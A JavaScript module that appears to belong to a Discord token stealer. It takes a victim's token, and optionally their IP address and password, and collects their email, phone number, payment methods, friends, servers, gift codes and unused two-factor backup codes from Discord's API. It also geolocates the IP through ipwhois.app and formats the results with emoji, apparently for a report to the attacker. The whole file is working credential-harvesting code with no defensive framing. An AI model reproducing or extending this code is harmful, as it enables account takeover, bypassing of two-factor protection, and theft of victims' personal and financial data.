"use strict";
const request = require("sync-request");

module.exports = class DiscordToken {
  constructor(token, ipAddress, password) {
    this.info = {};
    this.paymentSources = "";
    const user = this.getDiscordApi("https://discord.com/api/v9/users/@me", token);
    const profile = this.getDiscordApi(
      `https://discord.com/api/v9/users/${Buffer.from(
        token.split(".")[0],
        "base64",
      ).toString()}/profile`,
      token,
    );
    const settings = this.getDiscordApi(
      "https://discord.com/api/v9/users/@me/settings",
      token,
    );
    const paymentSources = this.getDiscordApi(
      "https://discord.com/api/v9/users/@me/billing/payment-sources",
      token,
    );
    const relationships = this.getDiscordApi(
      "https://discordapp.com/api/v9/users/@me/relationships",
      token,
    );
    const guilds = this.getDiscordApi(
      "https://discord.com/api/v9/users/@me/guilds",
      token,
    );
    const applications = this.getDiscordApi(
      "https://discord.com/api/v9/applications",
      token,
    );
    const connections = this.getDiscordApi(
      "https://discordapp.com/api/v9/users/@me/connections",
      token,
    );
    const entitlements = this.getDiscordApi(
      "https://discord.com/api/v8/users/@me/entitlements/gifts",
      token,
    );
    if (ipAddress) {
      if (Array.isArray(ipAddress)) {
        this.ipInfos = ipAddress.map(ip => this.getIpInfoAll(ip));
      } else {
        this.ipInfo = this.getIpInfoAll(ipAddress);
      }
    }
    
    if (!user || user === "Invalid") {
      console.error("Token invalid or nonexistent");
      return;
    }
    let creditCard = false;
    let paypal = false;
    paymentSources?.forEach((source) => {
      if (source.brand && source.invalid === 0) {
        creditCard = true;
      }
      if (source.email) {
        paypal = true;
      }
    });
    this.paymentSources = creditCard ? "<a:Card:932986286439038997> " : "";
    this.paymentSources += paypal ? "<:paypal:896441236062347374> " : "None";
    this.info = {
      "token": token,
      "ID": user.id,
      "username": `${user.username}#${user.discriminator}`,
      "badges": this.AllBadges(user.flags),
      "nitroType": this.getNitroPremium(profile),
      "avatar": user.avatar
        ? this.getImage(
            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
          )
        : "has no avatar",
      "banner": user.banner
      ? this.getImage(
          `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`,
        )
      : "has no banner",
      "totalFriend": relationships.filter((relation) => relation.type === 1)
        .length,
      "totalBlocked": relationships.filter((relation) => relation.type === 2)
        .length,
      "pending": relationships.filter((relation) => relation.type === 3).length,
      "billing": this.paymentSources,
      "NitroGifts": entitlements[0]
        ? entitlements.map((gift) => `${gift}, `).join("")
        : "None",
      "totalOwnedGuild": guilds.filter((guild) => guild.owner).length,
      "totalApplication": applications.length,
      "totalConnection": connections.length,
      "totalGuild": guilds.length,
      "NSFW": user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
      "verified": user.verified ? "✅" : "❌",
      "bio": user.bio || "has no description",
      "mail": user.email,
      "phone": user.phone || "has no phone",
      "langue": this.getLanguage(settings.locale),
      "status": this.getStatusEmoji(settings.status),
      "theme": this.getTheme(settings.theme),  
      "Gifts": this.getGiftsCodes(token, settings),
      "StrangeFriends": this.rareFriend(relationships),
    };
    this.guilds = {
      "": "Unfinished"
    };
    this.friends = {
      "": "Unfinished"
    }
    if (ipAddress) {
      if (Array.isArray(ipAddress)) {
        if (this.ipInfos.some(info => !info.success)) {
          this.info.IPs = {
            "message":"Unknown IPs",
            "success":this.ipInfos.success,
          }
          return;
        }
        this.info.IPs = this.ipInfos.map(info => ({
          "ip":info.ip,
          "success":info.success,
          "type":info.type,
          "continent":info.continent,
          "continent_code":info.continent_code,
          "country":info.country,
          "country_code":info.country_code,
          "country_capital":info.country_capital,
          "country_phone":info.country_phone,
          "country_neighbours":info.country_neighbours,
          "region":info.region,
          "city":info.city,
          "latitude":info.latitude,
          "longitude":info.longitude,
          "asn":info.asn,
          "org":info.org,
          "isp":info.isp,
          "timezone":info.timezone,
          "timezone_name":info.timezone_name,
          "timezone_dstOffset":info.timezone_dstOffset,
          "timezone_gmtOffset":info.timezone_gmtOffset,
          "timezone_gmt":info.timezone_gmt,
          "currency_code":info.currency_code,
          "currency_rates":info.currency_rates,
          "currency_plural":info.currency_plural,
        }));
      } else {
        if (!this.ipInfo.success) {
          this.info.IP = {
            "message":"Unknown IP",
            "success":this.ipInfo.success,
          }
          return;
        }
        this.info.IP = {
          "ip":this.ipInfo.ip,
          "success":this.ipInfo.success,
          "type":this.ipInfo.type,
          "continent":this.ipInfo.continent,
          "continent_code":this.ipInfo.continent_code,
          "country":this.ipInfo.country,
          "country_code":this.ipInfo.country_code,
          "country_capital":this.ipInfo.country_capital,
          "country_phone":this.ipInfo.country_phone,
          "country_neighbours":this.ipInfo.country_neighbours,
          "region":this.ipInfo.region,
          "city":this.ipInfo.city,
          "latitude":this.ipInfo.latitude,
          "longitude":this.ipInfo.longitude,
          "asn":this.ipInfo.asn,
          "org":this.ipInfo.org,
          "isp":this.ipInfo.isp,
          "timezone":this.ipInfo.timezone,
          "timezone_name":this.ipInfo.timezone_name,
          "timezone_dstOffset":this.ipInfo.timezone_dstOffset,
          "timezone_gmtOffset":this.ipInfo.timezone_gmtOffset,
          "timezone_gmt":this.ipInfo.timezone_gmt,
          "currency_code":this.ipInfo.currency_code,
          "currency_rates":this.ipInfo.currency_rates,
          "currency_plural":this.ipInfo.currency_plural,
        }
      }
    }
    if (password) {
      this.info.mfaCodes = this.getMfa2Codes(token, password);
    }
  }
  getMfa2Codes(token, password) {
    let result = "";
    try {
      const response = request(
        "POST",
        "https://discord.com/api/v9/users/@me/mfa/codes",
        { headers: { "Content-Type": "application/json", authorization: token },
          body: JSON.stringify({
            password: password,
            regenerate: false,
          }),
        },
      );
      const data = JSON.parse(response.getBody());
      if (data.backup_codes) {
        data.backup_codes.forEach((code) => {
          if (code.consumed === null) {
            result += `${code.code} | `;
          }
        });
        return result.slice(0, -2);
      } else {
        return "No backup codes found";
      }
    } catch (error) {
      return "Error retrieving MFA codes";
    }
  }
  getLanguage(locale) {
    const languages = {
      "zh-TW": "🇨🇳 Chinese-Taiwanese",
      "pr-BR": "🇵🇹 Portuguese",
      "sv-SE": "🇸🇪 Swedish",
      "zh-CN": "🇨🇳 Chinese-China",
      "en-GB": "🪟 English (UK)",
      "en-US": "🇺🇸 USA",
      "es-ES": "🇪🇸 Español",
      "ro": "🇷🇴 Romanian",
      "fi": "🇫🇮 Finnish",
      "vi": "🇻🇳 Vietnamese",
      "tr": "🇹🇷 Turkish",
      "ru": "🇷🇺 Russian",
      "uk": "🇺🇦 Ukrainian",
      "hi": "🇮🇳 Indian",
      "th": "🇹🇼 Taiwanese",
      "hr": "🇭🇷 Croatian",
      "it": "🇮🇹 Italianio",
      "lt": "🇱🇹 Lithuanian",
      "no": "🇳🇴 Norwegian",
      "ja": "🇯🇵 Japanese",
      "ko": "🇰🇷 Korean",
      "fr": "🇫🇷 French",
      "da": "🇩🇰 Dansk",
      "de": "🇩🇪 Deutsch",
      "pl": "🇵🇱 Polish",
      "cs": "🇨🇿 Czech",
      "el": "🇬🇷 Greek",
      "bg": "🇧🇬 Bulgarian",
      "hu": "🇳🇴🇭🇺 Hungarian",
    };
    return languages[locale] || "Unknown Language";
  }
  getStatusEmoji(status) {
    const statusEmojis = {
      "online": "<:online:1129709364316491787>",
      "idle": "<:idle:1120542710424674306>",
      "dnd": "<:dnd:974692691289993216>",
      "invisible": "<:offline:1137141023529762916>",
    };
    return statusEmojis[status] || "Unknown Status";
  }
  getTheme(theme) {
    const themes = {
      "dark": "Dark",
      "light": "Light",
    };
    return themes[theme] || "Unknown Theme";
  }
  getGiftsCodes(token, settings) {
    const result = [];
    const gifts = this.getDiscordApi(
      `https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`,
      token,
    );
    gifts?.forEach((gift) => {
      result.push({
        name: gift.promotion.outbound_title,
        code: gift.code,
      });
    });
    return result;
  }
  getDate(start, months) {
    const date = new Date(start);
    date.setMonth(date.getMonth() + months);
    return date.getTime();
  }
  getImage(url) {
    if (!url) return false;
    return (
      `${url}${(
          request("GET", url).headers["content-type"] 
          === "image/gif" 
          ? ".gif?size=512" 
          : ".png?size=512"
        )}`
    );
  }
  rareFriend(relationships) {
    let result = "";
    const friendRelationships = relationships.filter(
      (relationship) => relationship.type === 1,
    );
    for (const relationship of friendRelationships) {
      const badges = this.rareFriendadges(relationship.user.public_flags);

      if (badges !== "None") {
        result += `${badges} ${relationship.user.username}#${relationship.user.discriminator}\n`;
      }
    }
    return result || "None";
  }
  getIpInfoAll(ipAddress) {
    const url = `http://ipwhois.app/json/${ipAddress}`;
    const response = request("GET", url);
    if (response.statusCode === 200) {
      return JSON.parse(response.getBody("utf8"));
    } else return "None"
  }
  getDiscordApi(url, token) {
    const response = request("GET", url, {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    });
    if (response.statusCode === 200) {
      const data = JSON.parse(response.getBody("utf8"));
      return data.code === 0 ? "Invalid" : data;
    }
  }
  AllBadges(flags) {
    let result = "";
    if (1 & flags) result += "<:staff:891346298932981783> ";
    if (2 & flags) result += "<:partner:918207395279273985> ";
    if (4 & flags) result += "<:mm_iconHypeEvents:898186057588277259> ";
    if (8 & flags) result += "<:bughunter_1:874750808426692658> ";
    if (64 & flags) result += "<:bravery:874750808388952075> ";
    if (128 & flags) result += "<:brilliance:874750808338608199> ";
    if (256 & flags) result += "<:balance:874750808267292683> ";
    if (512 & flags) result += "<:early:944071770506416198> ";
    if (16384 & flags) result += "<:bughunter_2:874750808430874664> ";
    if (4194304 & flags) result += "<:activedev:1042545590640324608> ";
    if (131072 & flags) result += "<:mm_IconBotDev:898181029737680896> ";
    return result || ":x:";
  }
  rareFriendadges(flags) {
    let result = "";
    if (1 & flags) result += "<:staff:891346298932981783> ";
    if (2 & flags) result += "<:partner:918207395279273985> ";
    if (4 & flags) result += "<:mm_iconHypeEvents:898186057588277259> ";
    if (8 & flags) result += "<:bughunter_1:874750808426692658> ";
    if (4194304 & flags) result += "<:activedev:1042545590640324608> ";
    if (512 & flags) result += "<:early:944071770506416198> ";
    if (16384 & flags) result += "<:bughunter_2:874750808430874664> ";
    if (131072 & flags) result += "<:mm_IconBotDev:898181029737680896> ";
    return result || "None";
  }
  getNitroPremium(user) {
    const premium = {
      default: ":x:",
      1: "<:nitro:1067527697753968721>",
      2: () => {
        if (!user.premium_guild_since) return "<:nitro:1067527697753968721>";
        const now = Date.now();
        const iconsNitro = [
          "<:Booster1Month:1051453771147911208>",
          "<:Booster2Month:1051453772360077374>",
          "<:Booster6Month:1051453773463162890>",
          "<:Booster9Month:1051453774620803122>",
          "<:booster12month:1162420359291732038>",
          "<:Booster15Month:1051453775832961034>",
          "<:Booster18Month:1051453778127237180>",
          "<:Booster24Month:1051453776889917530>",
        ];
        const remainingDays = [2, 3, 6, 9, 12, 15, 18, 24].map((duration, index) => Math.round((this.getDate(user.premium_guild_since, duration) - now) / 86400000));
        const i = remainingDays.findIndex(day => day > 0);
        return `<:nitro:1067527697753968721> ${iconsNitro[i] || ""}`;
      }
    };
    return (premium[user.premium_type] || premium.default);
  }
}
